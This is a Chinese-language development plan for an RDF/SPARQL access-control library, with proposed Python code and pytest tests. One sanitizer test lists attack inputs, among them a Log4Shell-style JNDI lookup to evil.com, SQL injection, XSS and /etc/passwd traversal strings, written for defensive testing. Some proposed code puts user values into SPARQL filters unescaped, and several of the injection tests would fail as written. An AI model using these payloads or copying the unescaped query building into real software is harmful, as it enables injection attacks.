# SF-RDF-ACL 详细改进计划

> 计划制定时间：2025-10-18
> 执行周期：4周（分3个阶段）
> 基准文档：SF-RDF-ACL综合评估报告_20251018_182342.md

## 目录

- [第一阶段：P0级关键功能与安全修复（第1周）](#第一阶段p0级关键功能与安全修复第1周)
- [第二阶段：P1级功能补充与测试完善（第2-3周）](#第二阶段p1级功能补充与测试完善第2-3周)
- [第三阶段：性能优化与文档完善（第4周）](#第三阶段性能优化与文档完善第4周)
- [验收标准总览](#验收标准总览)

---

## 第一阶段：P0级关键功能与安全修复（第1周）

### 1.1 query模块改进

#### 任务1.1.1：实现查询参数安全转义
**文件**：`src/sf_rdf_acl/query/builder.py`

**新增内容**：
```python
# 新增安全工具类
class SPARQLSanitizer:
    """SPARQL参数安全转义工具"""

    @staticmethod
    def escape_uri(uri: str) -> str:
        """转义IRI中的特殊字符

        Args:
            uri: 原始IRI字符串

        Returns:
            转义后的安全IRI

        Raises:
            ValueError: 当IRI格式非法时
        """
        # 验证IRI格式
        if not uri or not isinstance(uri, str):
            raise ValueError(f"Invalid URI: {uri}")

        # 检查危险字符
        dangerous_chars = ['<', '>', '"', '{', '}', '|', '\\', '^', '`']
        if any(char in uri for char in dangerous_chars):
            raise ValueError(f"URI contains dangerous characters: {uri}")

        return uri

    @staticmethod
    def escape_literal(value: str, datatype: str | None = None) -> str:
        """转义字面量值

        Args:
            value: 字面量值
            datatype: 数据类型IRI

        Returns:
            转义后的SPARQL字面量表示
        """
        # 转义双引号和反斜杠
        escaped = value.replace('\\', '\\\\').replace('"', '\\"')

        if datatype:
            return f'"{escaped}"^^<{datatype}>'
        return f'"{escaped}"'

    @staticmethod
    def validate_prefix(prefix: str) -> bool:
        """验证前缀名称是否合法

        Args:
            prefix: 前缀名称

        Returns:
            是否合法
        """
        import re
        # 前缀必须符合XML NCName规则
        pattern = r'^[A-Za-z_][A-Za-z0-9_-]*$'
        return bool(re.match(pattern, prefix))
```

**修改SPARQLQueryBuilder**：
```python
class SPARQLQueryBuilder:
    def __init__(self, *, default_prefixes: dict[str, str] | None = None) -> None:
        self._default_prefixes = {**self._DEFAULT_PREFIXES}
        if default_prefixes:
            # 验证自定义前缀
            for prefix, uri in default_prefixes.items():
                if not SPARQLSanitizer.validate_prefix(prefix):
                    raise ValueError(f"Invalid prefix name: {prefix}")
                self._default_prefixes[prefix] = uri

        self._sanitizer = SPARQLSanitizer()

    def _escape_filter_value(self, value: Any) -> str:
        """安全转义过滤器值"""
        if isinstance(value, str):
            # 如果是IRI形式
            if value.startswith('http://') or value.startswith('https://'):
                return f"<{self._sanitizer.escape_uri(value)}>"
            # 普通字符串
            return self._sanitizer.escape_literal(value)
        elif isinstance(value, bool):
            return "true" if value else "false"
        elif isinstance(value, (int, float)):
            return str(value)
        else:
            raise ValueError(f"Unsupported filter value type: {type(value)}")
```

**验收标准**：
- [ ] SPARQLSanitizer类实现完整
- [ ] 所有特殊字符正确转义
- [ ] 注入攻击测试通过（至少5个恶意输入案例）
- [ ] 类型提示完整
- [ ] Docstring符合Google风格

**测试用例**：`tests/unit/query/test_sparql_sanitizer.py`
```python
import pytest
from sf_rdf_acl.query.builder import SPARQLSanitizer

class TestSPARQLSanitizer:
    def test_escape_uri_normal(self):
        """测试正常IRI转义"""
        uri = "http://example.com/resource"
        assert SPARQLSanitizer.escape_uri(uri) == uri

    def test_escape_uri_with_dangerous_chars(self):
        """测试危险字符检测"""
        with pytest.raises(ValueError):
            SPARQLSanitizer.escape_uri("http://example.com/<script>")

    def test_escape_literal_with_quotes(self):
        """测试双引号转义"""
        result = SPARQLSanitizer.escape_literal('Hello "World"')
        assert result == '"Hello \\"World\\""'

    def test_escape_literal_with_datatype(self):
        """测试带数据类型的字面量"""
        result = SPARQLSanitizer.escape_literal(
            "2023-01-01",
            "http://www.w3.org/2001/XMLSchema#date"
        )
        assert '^^<http://www.w3.org/2001/XMLSchema#date>' in result

    def test_validate_prefix_valid(self):
        """测试合法前缀"""
        assert SPARQLSanitizer.validate_prefix("rdf")
        assert SPARQLSanitizer.validate_prefix("my_prefix")
        assert SPARQLSanitizer.validate_prefix("prefix123")

    def test_validate_prefix_invalid(self):
        """测试非法前缀"""
        assert not SPARQLSanitizer.validate_prefix("123prefix")
        assert not SPARQLSanitizer.validate_prefix("pre-fix!")
        assert not SPARQLSanitizer.validate_prefix("")

    def test_sql_injection_attempt(self):
        """测试SQL注入防护"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        for input_str in malicious_inputs:
            # 应该抛出异常或安全转义
            with pytest.raises(ValueError):
                SPARQLSanitizer.escape_uri(input_str)
```

---

#### 任务1.1.2：实现聚合查询支持
**文件**：`src/sf_rdf_acl/query/builder.py`, `src/sf_rdf_acl/query/dsl.py`

**新增DSL类型**：
```python
# src/sf_rdf_acl/query/dsl.py
from dataclasses import dataclass
from typing import Literal

@dataclass(frozen=True, slots=True)
class Aggregation:
    """聚合查询定义"""

    function: Literal["COUNT", "SUM", "AVG", "MIN", "MAX", "GROUP_CONCAT"]
    variable: str  # 聚合的变量，如 "?s"
    alias: str | None = None  # 结果别名
    distinct: bool = False  # 是否使用DISTINCT
    separator: str | None = None  # GROUP_CONCAT的分隔符

@dataclass(frozen=True, slots=True)
class GroupBy:
    """分组定义"""

    variables: list[str]  # 分组变量列表

# 扩展QueryDSL
@dataclass(frozen=True, slots=True)
class QueryDSL:
    # ... 现有字段 ...

    aggregations: list[Aggregation] | None = None
    group_by: GroupBy | None = None
    having: list[Filter] | None = None  # HAVING子句
```

**扩展SPARQLQueryBuilder**：
```python
class SPARQLQueryBuilder:
    def _build_aggregation_clause(self, agg: Aggregation) -> str:
        """构建聚合函数子句

        Args:
            agg: 聚合定义

        Returns:
            SPARQL聚合表达式
        """
        func = agg.function
        var = agg.variable

        # 构建基础聚合
        if agg.distinct:
            expr = f"{func}(DISTINCT {var})"
        else:
            expr = f"{func}({var})"

        # GROUP_CONCAT特殊处理
        if func == "GROUP_CONCAT" and agg.separator:
            sep = self._sanitizer.escape_literal(agg.separator)
            expr = f"GROUP_CONCAT({var}; SEPARATOR={sep})"

        # 添加别名
        if agg.alias:
            expr = f"({expr} AS {agg.alias})"

        return expr

    def _build_group_by_clause(self, group_by: GroupBy) -> str:
        """构建GROUP BY子句"""
        if not group_by or not group_by.variables:
            return ""

        vars_str = " ".join(group_by.variables)
        return f"GROUP BY {vars_str}"

    def _build_having_clause(self, having: list[Filter]) -> str:
        """构建HAVING子句"""
        if not having:
            return ""

        conditions = []
        for f in having:
            # 复用filter构建逻辑，但用于HAVING上下文
            cond = self._build_filter_condition(f)
            conditions.append(cond)

        return f"HAVING {' && '.join(conditions)}"

    def build_select(self, dsl: QueryDSL, *, graph: str | None = None) -> str:
        """构建SELECT查询，支持聚合"""
        parts = []

        # 前缀
        parts.append(self._build_prefixes())

        # SELECT子句
        if dsl.aggregations:
            # 聚合查询
            select_exprs = []
            for agg in dsl.aggregations:
                select_exprs.append(self._build_aggregation_clause(agg))

            # 如果有GROUP BY，也要选择分组变量
            if dsl.group_by:
                select_exprs.extend(dsl.group_by.variables)

            parts.append(f"SELECT {' '.join(select_exprs)}")
        else:
            # 普通查询
            parts.append("SELECT *")

        # WHERE子句
        where_clause = self._build_where_clause(dsl, graph)
        parts.append(where_clause)

        # GROUP BY
        if dsl.group_by:
            parts.append(self._build_group_by_clause(dsl.group_by))

        # HAVING
        if dsl.having:
            parts.append(self._build_having_clause(dsl.having))

        # ORDER BY, LIMIT等
        # ... 现有逻辑 ...

        return "\n".join(parts)
```

**验收标准**：
- [ ] 支持COUNT/SUM/AVG/MIN/MAX/GROUP_CONCAT
- [ ] DISTINCT聚合正确实现
- [ ] GROUP BY多变量分组正常
- [ ] HAVING过滤正确
- [ ] 生成的SPARQL语法正确（手动验证3个复杂查询）
- [ ] 类型提示完整

**测试用例**：`tests/unit/query/test_aggregation.py`
```python
import pytest
from sf_rdf_acl.query.builder import SPARQLQueryBuilder
from sf_rdf_acl.query.dsl import QueryDSL, Aggregation, GroupBy, Filter

class TestAggregation:
    def setup_method(self):
        self.builder = SPARQLQueryBuilder()

    def test_count_aggregation(self):
        """测试COUNT聚合"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[Aggregation(function="COUNT", variable="?s", alias="?count")]
        )
        sparql = self.builder.build_select(dsl)
        assert "COUNT(?s) AS ?count" in sparql

    def test_count_distinct(self):
        """测试COUNT DISTINCT"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[
                Aggregation(function="COUNT", variable="?s", distinct=True)
            ]
        )
        sparql = self.builder.build_select(dsl)
        assert "COUNT(DISTINCT ?s)" in sparql

    def test_group_by(self):
        """测试GROUP BY"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[Aggregation(function="COUNT", variable="?s")],
            group_by=GroupBy(variables=["?type"])
        )
        sparql = self.builder.build_select(dsl)
        assert "GROUP BY ?type" in sparql
        assert "?type" in sparql.split("SELECT")[1].split("WHERE")[0]

    def test_multiple_aggregations(self):
        """测试多个聚合"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[
                Aggregation(function="COUNT", variable="?s", alias="?cnt"),
                Aggregation(function="AVG", variable="?value", alias="?avg")
            ]
        )
        sparql = self.builder.build_select(dsl)
        assert "COUNT(?s) AS ?cnt" in sparql
        assert "AVG(?value) AS ?avg" in sparql

    def test_group_concat_with_separator(self):
        """测试GROUP_CONCAT"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[
                Aggregation(
                    function="GROUP_CONCAT",
                    variable="?label",
                    separator=", "
                )
            ]
        )
        sparql = self.builder.build_select(dsl)
        assert "GROUP_CONCAT" in sparql
        assert "SEPARATOR" in sparql

    def test_having_clause(self):
        """测试HAVING子句"""
        dsl = QueryDSL(
            type="entity",
            aggregations=[Aggregation(function="COUNT", variable="?s", alias="?cnt")],
            group_by=GroupBy(variables=["?type"]),
            having=[Filter(field="?cnt", operator=">", value=10)]
        )
        sparql = self.builder.build_select(dsl)
        assert "HAVING" in sparql
        assert "?cnt > 10" in sparql or "?cnt>10" in sparql
```

---

### 1.2 graph模块改进

#### 任务1.2.1：实现条件清理功能
**文件**：`src/sf_rdf_acl/graph/named_graph.py`

**新增数据类型**：
```python
# src/sf_rdf_acl/graph/named_graph.py
from dataclasses import dataclass
from typing import Literal

@dataclass(frozen=True, slots=True)
class TriplePattern:
    """三元组模式定义"""

    subject: str | None = None  # None表示变量
    predicate: str | None = None
    object: str | None = None

    def to_sparql(self) -> str:
        """转换为SPARQL模式"""
        s = self.subject or "?s"
        p = self.predicate or "?p"
        o = self.object or "?o"
        return f"{s} {p} {o}"

@dataclass
class ClearCondition:
    """清理条件定义"""

    patterns: list[TriplePattern]  # 三元组模式列表
    subject_prefix: str | None = None  # 主语IRI前缀过滤
    predicate_whitelist: list[str] | None = None  # 谓词白名单
    object_type: str | None = None  # 对象类型过滤（仅限IRI或Literal）

@dataclass
class DryRunResult:
    """Dry-Run结果"""

    graph_iri: str
    estimated_deletes: int  # 预计删除数量
    sample_triples: list[dict[str, str]]  # 样本三元组（最多10条）
    execution_time_estimate_ms: float  # 预计执行时间
```

**扩展NamedGraphManager**：
```python
class NamedGraphManager:
    async def conditional_clear(
        self,
        graph: GraphRef,
        condition: ClearCondition,
        *,
        dry_run: bool = True,
        trace_id: str,
        max_deletes: int = 10000,
    ) -> DryRunResult | dict[str, Any]:
        """条件清理命名图

        Args:
            graph: 命名图引用
            condition: 清理条件
            dry_run: 是否仅预览（默认True，安全模式）
            trace_id: 追踪ID
            max_deletes: 最大删除数量限制（防止误删）

        Returns:
            dry_run=True时返回DryRunResult，否则返回执行结果

        Raises:
            ValueError: 条件不合法
            ExternalServiceError: 执行失败
        """
        graph_iri = self._resolve_graph(graph)

        # 构建删除模式
        delete_clause, where_clause = self._build_conditional_delete(
            condition, graph_iri
        )

        if dry_run:
            # Dry-Run: 估算影响
            return await self._estimate_conditional_delete(
                graph_iri, where_clause, trace_id
            )
        else:
            # 实际执行
            return await self._execute_conditional_delete(
                graph_iri,
                delete_clause,
                where_clause,
                max_deletes,
                trace_id,
            )

    def _build_conditional_delete(
        self, condition: ClearCondition, graph_iri: str
    ) -> tuple[str, str]:
        """构建条件删除的DELETE和WHERE子句"""
        # WHERE子句
        where_parts = []

        # 基础模式
        for pattern in condition.patterns:
            where_parts.append(pattern.to_sparql())

        # 添加过滤条件
        filters = []
        if condition.subject_prefix:
            filters.append(
                f'FILTER(STRSTARTS(STR(?s), "{condition.subject_prefix}"))'
            )

        if condition.predicate_whitelist:
            pred_values = ' '.join(f'<{p}>' for p in condition.predicate_whitelist)
            filters.append(f'FILTER(?p IN ({pred_values}))')

        if condition.object_type:
            if condition.object_type == "IRI":
                filters.append('FILTER(isIRI(?o))')
            elif condition.object_type == "Literal":
                filters.append('FILTER(isLiteral(?o))')

        where_clause = "WHERE {\n"
        where_clause += f"  GRAPH <{graph_iri}> {{\n"
        for part in where_parts:
            where_clause += f"    {part} .\n"
        for filt in filters:
            where_clause += f"    {filt}\n"
        where_clause += "  }\n}"

        # DELETE子句
        delete_clause = "DELETE {\n"
        delete_clause += f"  GRAPH <{graph_iri}> {{\n"
        for pattern in condition.patterns:
            delete_clause += f"    {pattern.to_sparql()} .\n"
        delete_clause += "  }\n}"

        return delete_clause, where_clause

    async def _estimate_conditional_delete(
        self, graph_iri: str, where_clause: str, trace_id: str
    ) -> DryRunResult:
        """估算条件删除的影响"""
        import time
        start = time.perf_counter()

        # 构建COUNT查询
        count_query = f"""
        SELECT (COUNT(*) AS ?count)
        {where_clause}
        """

        count_result = await self._client.select(count_query, trace_id=trace_id)
        count = int(count_result["results"]["bindings"][0]["count"]["value"])

        # 获取样本
        sample_query = f"""
        SELECT *
        {where_clause}
        LIMIT 10
        """

        sample_result = await self._client.select(sample_query, trace_id=trace_id)
        samples = sample_result["results"]["bindings"]

        duration = (time.perf_counter() - start) * 1000

        return DryRunResult(
            graph_iri=graph_iri,
            estimated_deletes=count,
            sample_triples=samples,
            execution_time_estimate_ms=duration * (count / 10) if count > 10 else duration,
        )

    async def _execute_conditional_delete(
        self,
        graph_iri: str,
        delete_clause: str,
        where_clause: str,
        max_deletes: int,
        trace_id: str,
    ) -> dict[str, Any]:
        """执行条件删除"""
        # 先检查数量
        dry_result = await self._estimate_conditional_delete(
            graph_iri, where_clause, trace_id
        )

        if dry_result.estimated_deletes > max_deletes:
            raise ValueError(
                f"Estimated deletes ({dry_result.estimated_deletes}) "
                f"exceeds max_deletes ({max_deletes})"
            )

        # 执行删除
        update_query = f"{delete_clause}\n{where_clause}"
        result = await self._client.update(update_query, trace_id=trace_id)

        return {
            "graph": graph_iri,
            "deleted_count": dry_result.estimated_deletes,
            "execution_time_ms": result.get("durationMs", 0),
        }
```

**验收标准**：
- [ ] 支持三元组模式删除
- [ ] 支持主语前缀过滤
- [ ] 支持谓词白名单
- [ ] 支持对象类型过滤
- [ ] Dry-Run正确估算（误差<10%）
- [ ] max_deletes限制生效
- [ ] 异常处理完整

**测试用例**：`tests/unit/graph/test_conditional_clear.py`
```python
import pytest
import pytest_asyncio
from sf_rdf_acl.graph.named_graph import (
    NamedGraphManager,
    TriplePattern,
    ClearCondition,
)
from sf_rdf_acl.query.dsl import GraphRef

@pytest.mark.asyncio
class TestConditionalClear:
    @pytest_asyncio.fixture
    async def manager(self):
        return NamedGraphManager()

    async def test_dry_run_basic(self, manager):
        """测试基础Dry-Run"""
        graph = GraphRef(model="test", version="v1", env="dev")
        condition = ClearCondition(
            patterns=[TriplePattern(predicate="<http://example.com/pred>")]
        )

        result = await manager.conditional_clear(
            graph, condition, dry_run=True, trace_id="test-001"
        )

        assert result.graph_iri
        assert result.estimated_deletes >= 0
        assert isinstance(result.sample_triples, list)

    async def test_subject_prefix_filter(self, manager):
        """测试主语前缀过滤"""
        graph = GraphRef(model="test", version="v1", env="dev")
        condition = ClearCondition(
            patterns=[TriplePattern()],
            subject_prefix="http://example.com/specific/"
        )

        result = await manager.conditional_clear(
            graph, condition, dry_run=True, trace_id="test-002"
        )

        # 验证样本都符合前缀
        for triple in result.sample_triples:
            if 's' in triple:
                assert triple['s']['value'].startswith("http://example.com/specific/")

    async def test_predicate_whitelist(self, manager):
        """测试谓词白名单"""
        graph = GraphRef(model="test", version="v1", env="dev")
        allowed_preds = [
            "http://www.w3.org/2000/01/rdf-schema#label",
            "http://www.w3.org/2000/01/rdf-schema#comment"
        ]
        condition = ClearCondition(
            patterns=[TriplePattern()],
            predicate_whitelist=allowed_preds
        )

        result = await manager.conditional_clear(
            graph, condition, dry_run=True, trace_id="test-003"
        )

        # 验证样本谓词在白名单内
        for triple in result.sample_triples:
            if 'p' in triple:
                assert triple['p']['value'] in allowed_preds

    async def test_max_deletes_limit(self, manager):
        """测试删除数量限制"""
        graph = GraphRef(model="test", version="v1", env="dev")
        condition = ClearCondition(
            patterns=[TriplePattern()]  # 匹配所有
        )

        with pytest.raises(ValueError, match="exceeds max_deletes"):
            await manager.conditional_clear(
                graph,
                condition,
                dry_run=False,
                max_deletes=10,  # 设置很小的限制
                trace_id="test-004"
            )

    async def test_execute_conditional_delete(self, manager, graph_with_test_data):
        """测试实际执行删除"""
        graph = graph_with_test_data
        condition = ClearCondition(
            patterns=[TriplePattern(predicate="<http://example.com/toDelete>")]
        )

        # 先Dry-Run
        dry_result = await manager.conditional_clear(
            graph, condition, dry_run=True, trace_id="test-005"
        )
        initial_count = dry_result.estimated_deletes

        # 实际执行
        result = await manager.conditional_clear(
            graph, condition, dry_run=False, trace_id="test-006"
        )

        assert result["deleted_count"] == initial_count

        # 验证删除成功
        verify_result = await manager.conditional_clear(
            graph, condition, dry_run=True, trace_id="test-007"
        )
        assert verify_result.estimated_deletes == 0
```

---

### 1.3 converter模块改进

#### 任务1.3.1：实现JSON-LD格式输出
**文件**：`src/sf_rdf_acl/converter/graph_formatter.py`

**新增功能**：
```python
from typing import Literal
from rdflib import Graph as RDFGraph
import json

FormatType = Literal["turtle", "json-ld", "simplified-json"]

class GraphFormatter:
    """图数据格式化器"""

    def __init__(self):
        self._logger = LoggerFactory.create_default_logger(__name__)

    def format_graph(
        self,
        turtle_data: str,
        format_type: FormatType = "turtle",
        context: dict[str, Any] | None = None,
    ) -> str | dict[str, Any]:
        """格式化图数据

        Args:
            turtle_data: Turtle格式的RDF数据
            format_type: 目标格式类型
            context: JSON-LD上下文（仅format_type="json-ld"时有效）

        Returns:
            格式化后的数据（turtle返回str，其他返回dict）
        """
        if format_type == "turtle":
            return turtle_data

        # 解析Turtle到RDFLib Graph
        graph = RDFGraph()
        graph.parse(data=turtle_data, format="turtle")

        if format_type == "json-ld":
            return self._to_jsonld(graph, context)
        elif format_type == "simplified-json":
            return self._to_simplified_json(graph)
        else:
            raise ValueError(f"Unsupported format: {format_type}")

    def _to_jsonld(
        self, graph: RDFGraph, context: dict[str, Any] | None
    ) -> dict[str, Any]:
        """转换为JSON-LD格式"""
        # 使用rdflib内置JSON-LD序列化
        jsonld_str = graph.serialize(format="json-ld")
        jsonld_data = json.loads(jsonld_str)

        # 应用自定义上下文
        if context:
            jsonld_data["@context"] = context

        return jsonld_data

    def _to_simplified_json(self, graph: RDFGraph) -> dict[str, Any]:
        """转换为简化JSON格式

        格式示例:
        {
            "nodes": [
                {"id": "uri1", "type": "Class", "label": "..."},
                ...
            ],
            "edges": [
                {"source": "uri1", "target": "uri2", "predicate": "..."},
                ...
            ]
        }
        """
        from rdflib import RDF, RDFS, URIRef, Literal

        nodes = {}
        edges = []

        # 收集节点
        for s, p, o in graph:
            # 主语作为节点
            if isinstance(s, URIRef) and str(s) not in nodes:
                nodes[str(s)] = {
                    "id": str(s),
                    "type": None,
                    "label": None,
                    "properties": {}
                }

            # 宾语如果是URI也作为节点
            if isinstance(o, URIRef) and str(o) not in nodes:
                nodes[str(o)] = {
                    "id": str(o),
                    "type": None,
                    "label": None,
                    "properties": {}
                }

            # 处理特殊属性
            if p == RDF.type and isinstance(o, URIRef):
                nodes[str(s)]["type"] = str(o)
            elif p == RDFS.label:
                nodes[str(s)]["label"] = str(o)
            elif isinstance(o, Literal):
                # 数据属性
                nodes[str(s)]["properties"][str(p)] = {
                    "value": str(o),
                    "datatype": str(o.datatype) if o.datatype else None,
                    "language": o.language
                }
            elif isinstance(o, URIRef):
                # 对象属性->边
                edges.append({
                    "source": str(s),
                    "target": str(o),
                    "predicate": str(p)
                })

        return {
            "nodes": list(nodes.values()),
            "edges": edges,
            "stats": {
                "node_count": len(nodes),
                "edge_count": len(edges)
            }
        }
```

**验收标准**：
- [ ] Turtle到JSON-LD转换正确
- [ ] 自定义@context应用正常
- [ ] simplified-json格式符合规范
- [ ] 节点和边正确提取
- [ ] 数据属性和对象属性区分正确
- [ ] 支持多语言标签

**测试用例**：`tests/unit/converter/test_graph_formatter.py`
```python
import pytest
from sf_rdf_acl.converter.graph_formatter import GraphFormatter

class TestGraphFormatter:
    def setup_method(self):
        self.formatter = GraphFormatter()
        self.sample_turtle = """
        @prefix ex: <http://example.com/> .
        @prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .

        ex:Person1 a ex:Person ;
            rdfs:label "Alice" ;
            ex:age 30 ;
            ex:knows ex:Person2 .

        ex:Person2 a ex:Person ;
            rdfs:label "Bob" .
        """

    def test_format_turtle(self):
        """测试Turtle透传"""
        result = self.formatter.format_graph(
            self.sample_turtle, format_type="turtle"
        )
        assert result == self.sample_turtle

    def test_format_jsonld(self):
        """测试JSON-LD转换"""
        result = self.formatter.format_graph(
            self.sample_turtle, format_type="json-ld"
        )

        assert isinstance(result, dict)
        assert "@context" in result or "@graph" in result

    def test_format_jsonld_with_context(self):
        """测试带自定义上下文的JSON-LD"""
        custom_context = {
            "ex": "http://example.com/",
            "name": "http://www.w3.org/2000/01/rdf-schema#label"
        }

        result = self.formatter.format_graph(
            self.sample_turtle,
            format_type="json-ld",
            context=custom_context
        )

        assert result["@context"] == custom_context

    def test_format_simplified_json(self):
        """测试简化JSON格式"""
        result = self.formatter.format_graph(
            self.sample_turtle, format_type="simplified-json"
        )

        assert "nodes" in result
        assert "edges" in result
        assert "stats" in result

        # 验证节点
        assert len(result["nodes"]) == 2  # Person1 and Person2
        person1 = next(n for n in result["nodes"] if "Person1" in n["id"])
        assert person1["type"] == "http://example.com/Person"
        assert person1["label"] == "Alice"
        assert "age" in person1["properties"]

        # 验证边
        knows_edge = next(
            e for e in result["edges"]
            if e["predicate"] == "http://example.com/knows"
        )
        assert "Person1" in knows_edge["source"]
        assert "Person2" in knows_edge["target"]

    def test_invalid_format_type(self):
        """测试无效格式类型"""
        with pytest.raises(ValueError, match="Unsupported format"):
            self.formatter.format_graph(
                self.sample_turtle, format_type="invalid"
            )
```

---

### 1.4 测试基础设施建设

#### 任务1.4.1：迁移Legacy测试
**目标**：将`tests/legacy/`下的16个测试迁移到新架构

**迁移清单**：
```
tests/legacy/unit/infrastructure/rdf/
├── test_fuseki_client_resilience.py     → tests/unit/connection/
├── test_graph_projection_builder_async.py → tests/unit/graph/
├── test_graph_projection_filters.py      → tests/unit/graph/
├── test_named_graph_manager_*.py (3个)   → tests/unit/graph/
├── test_provenance_statements.py        → tests/unit/provenance/
├── test_query_builder*.py (4个)          → tests/unit/query/
├── test_result_mapper.py                → tests/unit/converter/
├── test_transaction_manager*.py (3个)    → tests/unit/transaction/
└── test_upsert_planner*.py (3个)        → tests/unit/transaction/
```

**迁移步骤**（每个文件）：
1. 创建新目录结构 `tests/unit/{module}/`
2. 复制测试文件到新位置
3. 更新import路径（从`sf_rdf_acl.xxx`导入）
4. 更新fixture使用（使用新的conftest.py）
5. 运行测试确保通过
6. 删除legacy文件

**验收标准**：
- [ ] 所有16个文件迁移完成
- [ ] 所有测试通过（允许修改适配新接口）
- [ ] 测试覆盖率不降低
- [ ] legacy目录可删除

---

## 第二阶段：P1级功能补充与测试完善（第2-3周）

### 2.1 query模块P1改进

#### 任务2.1.1：实现稳定游标分页
**文件**：`src/sf_rdf_acl/query/pagination.py`（新建）

**新增内容**：
```python
from dataclasses import dataclass
from typing import Any
import hashlib
import json
import base64

@dataclass(frozen=True, slots=True)
class CursorPage:
    """基于游标的分页定义"""

    cursor: str | None = None  # 当前游标
    size: int = 100  # 每页大小

@dataclass
class PageResult:
    """分页结果"""

    results: list[dict[str, Any]]
    next_cursor: str | None  # 下一页游标
    has_more: bool  # 是否还有更多数据
    total_estimate: int | None = None  # 总数估算

class CursorPagination:
    """游标分页实现"""

    @staticmethod
    def encode_cursor(last_item: dict[str, Any], sort_key: str) -> str:
        """编码游标

        Args:
            last_item: 当前页最后一项
            sort_key: 排序键（如"?s"）

        Returns:
            Base64编码的游标字符串
        """
        if sort_key not in last_item:
            raise ValueError(f"Sort key {sort_key} not in item")

        cursor_data = {
            "value": last_item[sort_key]["value"],
            "type": last_item[sort_key].get("type", "uri")
        }

        json_str = json.dumps(cursor_data, sort_keys=True)
        return base64.urlsafe_b64encode(json_str.encode()).decode()

    @staticmethod
    def decode_cursor(cursor: str) -> dict[str, Any]:
        """解码游标"""
        try:
            json_str = base64.urlsafe_b64decode(cursor.encode()).decode()
            return json.loads(json_str)
        except Exception as e:
            raise ValueError(f"Invalid cursor: {e}")

    @staticmethod
    def build_cursor_filter(cursor_data: dict[str, Any], sort_key: str) -> str:
        """构建游标过滤条件

        Args:
            cursor_data: 解码后的游标数据
            sort_key: 排序键

        Returns:
            SPARQL FILTER语句
        """
        value = cursor_data["value"]
        value_type = cursor_data["type"]

        if value_type == "uri":
            # IRI比较
            return f'FILTER(STR({sort_key}) > "{value}")'
        else:
            # 字面量比较
            return f'FILTER({sort_key} > "{value}")'

# 扩展SPARQLQueryBuilder
class SPARQLQueryBuilder:
    def build_select_with_cursor(
        self,
        dsl: QueryDSL,
        cursor_page: CursorPage,
        sort_key: str = "?s",
        *,
        graph: str | None = None
    ) -> str:
        """构建带游标分页的SELECT查询

        Args:
            dsl: 查询DSL
            cursor_page: 游标分页参数
            sort_key: 排序键（必须在SELECT中）
            graph: 命名图

        Returns:
            SPARQL查询字符串
        """
        # 基础查询
        parts = [self._build_prefixes()]
        parts.append(f"SELECT * WHERE {{")

        if graph:
            parts.append(f"  GRAPH <{graph}> {{")

        # WHERE内容
        where_content = self._build_where_content(dsl)
        parts.append(where_content)

        # 游标过滤
        if cursor_page.cursor:
            cursor_data = CursorPagination.decode_cursor(cursor_page.cursor)
            cursor_filter = CursorPagination.build_cursor_filter(
                cursor_data, sort_key
            )
            parts.append(f"  {cursor_filter}")

        if graph:
            parts.append("  }")

        parts.append("}")

        # 排序和限制
        parts.append(f"ORDER BY {sort_key}")
        parts.append(f"LIMIT {cursor_page.size + 1}")  # 多取1个判断是否有下一页

        return "\n".join(parts)
```

**验收标准**：
- [ ] 游标编码/解码正确
- [ ] 跨页查询无重复/遗漏
- [ ] 支持IRI和Literal排序
- [ ] has_more判断准确
- [ ] 性能测试：10万条数据分页稳定

**测试用例**：`tests/unit/query/test_cursor_pagination.py`
```python
import pytest
from sf_rdf_acl.query.pagination import CursorPagination, CursorPage

class TestCursorPagination:
    def test_encode_decode_cursor(self):
        """测试游标编解码"""
        last_item = {
            "s": {"value": "http://example.com/resource/100", "type": "uri"}
        }

        cursor = CursorPagination.encode_cursor(last_item, "?s")
        decoded = CursorPagination.decode_cursor(cursor)

        assert decoded["value"] == "http://example.com/resource/100"
        assert decoded["type"] == "uri"

    def test_cursor_filter_uri(self):
        """测试IRI游标过滤"""
        cursor_data = {
            "value": "http://example.com/resource/100",
            "type": "uri"
        }

        filter_str = CursorPagination.build_cursor_filter(cursor_data, "?s")
        assert 'STR(?s) >' in filter_str
        assert "http://example.com/resource/100" in filter_str

    def test_cursor_filter_literal(self):
        """测试字面量游标过滤"""
        cursor_data = {"value": "100", "type": "literal"}

        filter_str = CursorPagination.build_cursor_filter(cursor_data, "?value")
        assert '?value >' in filter_str

    @pytest.mark.asyncio
    async def test_pagination_no_duplicates(self, fuseki_client, large_dataset):
        """测试分页无重复"""
        all_results = set()
        cursor = None
        page_count = 0

        while True:
            cursor_page = CursorPage(cursor=cursor, size=100)
            # 执行查询...
            page_results = await fetch_page(fuseki_client, cursor_page)

            # 检查无重复
            for item in page_results.results:
                item_id = item["s"]["value"]
                assert item_id not in all_results, f"Duplicate: {item_id}"
                all_results.add(item_id)

            if not page_results.has_more:
                break

            cursor = page_results.next_cursor
            page_count += 1

            # 防止无限循环
            assert page_count < 1000

        # 验证总数
        assert len(all_results) > 0
```

---

### 2.2 transaction模块改进

#### 任务2.2.1：优化批量操作
**文件**：`src/sf_rdf_acl/transaction/batch.py`（新建）

**新增功能**：
```python
from dataclasses import dataclass
from typing import Callable

@dataclass
class BatchTemplate:
    """批量操作模板"""

    pattern: str  # SPARQL模式，如 "{?s} <pred> {?o} ."
    bindings: list[dict[str, str]]  # 绑定值列表

@dataclass
class BatchResult:
    """批量操作结果"""

    total: int
    success: int
    failed: int
    failed_items: list[dict[str, Any]]  # 失败项详情
    duration_ms: float

class BatchOperator:
    """批量操作执行器"""

    def __init__(
        self,
        client: RDFClient,
        batch_size: int = 1000,
        max_retries: int = 3
    ):
        self._client = client
        self._batch_size = batch_size
        self._max_retries = max_retries
        self._logger = LoggerFactory.create_default_logger(__name__)

    async def apply_template(
        self,
        template: BatchTemplate,
        graph_iri: str,
        *,
        trace_id: str,
        dry_run: bool = False
    ) -> BatchResult:
        """应用批量模板

        Args:
            template: 批量模板
            graph_iri: 目标图IRI
            trace_id: 追踪ID
            dry_run: 仅验证不执行

        Returns:
            批量操作结果
        """
        import time
